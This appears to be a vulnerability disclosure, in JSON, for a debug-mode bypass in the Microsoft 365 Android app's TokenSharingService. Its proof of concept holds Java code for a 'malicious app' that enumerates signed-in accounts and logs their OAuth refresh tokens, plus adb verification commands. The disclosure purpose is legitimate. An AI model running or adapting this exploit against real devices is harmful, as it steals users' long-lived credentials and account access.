{"valid":true,"title":"TokenSharingService debug mode bypass allows any app to steal OAuth refresh tokens on non-release builds","summary":"## TokenSharingService Debug Mode Bypass — OAuth Refresh Token Theft

The `TokenSharingService` in the Microsoft 365 Android app exposes a bound AIDL service (`ITokenProvider`) that returns OAuth refresh tokens and signed-in account information. The `isCallerAllowed()` gate (lines 227-237 of `TokenSharingService.java`) returns `true` if **either** the caller has a valid Microsoft signature **or** debug mode is enabled: `return z || isDebugMode;`.

Debug mode is set in `r.java`'s `G0()` method by checking if the APK is signed with a hardcoded Microsoft release certificate SHA256 hash. If the signature does **not** match — i.e., on any debug, sideloaded, or beta build — `isDebugMode` is set to `true` and persisted in `SharedPreferences` under key `TSLDebugMode`. Additionally, `PackageUtils.java` uses `MAMPackageManagement.getPackageInfo(..., 64)` which maps to `FLAG_GET_SIGNATURES` (flag 64), a call known to be vulnerable to the Android "Janus" signature bypass on devices running Android < 28, where an attacker-injected fake certificate is returned instead of the real one.

On any non-release (debug/sideloaded/beta) build of Microsoft 365, **any third-party app** that binds to `TokenSharingService` will pass the `isCallerAllowed()` check and can call `getAccounts()` to enumerate all signed-in Microsoft accounts and `getToken(accountInfo)` to retrieve their OAuth refresh tokens. A refresh token grants long-lived access to Microsoft services (OneDrive, Outlook, Teams, etc.) without requiring the user's password or MFA.","proofOfConcept":"## Prerequisites
- A device running a **debug/sideloaded/beta build** of Microsoft 365 (where `TSLDebugMode = true` in SharedPreferences), OR an Android device < API 28 (Android 8.1) for the Janus bypass path.
- A malicious app installed on the same device.

## Steps to Verify

### 1. Confirm debug mode is active
On a non-release M365 build, inspect SharedPreferences:
```bash
adb shell run-as com.microsoft.office.officemobile cat /data/data/com.microsoft.office.officemobile/shared_prefs/*.xml | grep TSLDebugMode
```
If `TSLDebugMode = true`, the bypass is active.

### 2. Create a malicious app that binds to TokenSharingService
```java
// In a malicious Android app:
Intent intent = new Intent("com.microsoft.tokenshare.TokenSharingService");
intent.setClassName("com.microsoft.office.officemobile",
    "com.microsoft.tokenshare.TokenSharingService");

bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        ITokenProvider provider = ITokenProvider.Stub.asInterface(service);
        try {
            List<AccountInfo> accounts = provider.getAccounts();
            for (AccountInfo account : accounts) {
                Log.i("STEAL", "Account: " + account.getEmail());
                RefreshToken token = provider.getToken(account);
                Log.i("STEAL", "RefreshToken: " + token.getToken());
            }
        } catch (RemoteException e) { e.printStackTrace(); }
    }
    @Override public void onServiceDisconnected(ComponentName name) {}
}, Context.BIND_AUTO_CREATE);
```

### 3. Confirm token theft
Check logcat output — the refresh token for every signed-in Microsoft account will be printed. These tokens can then be used against Microsoft's OAuth endpoints to access OneDrive, Outlook, Teams, SharePoint, etc.

```bash
adb logcat | grep STEAL
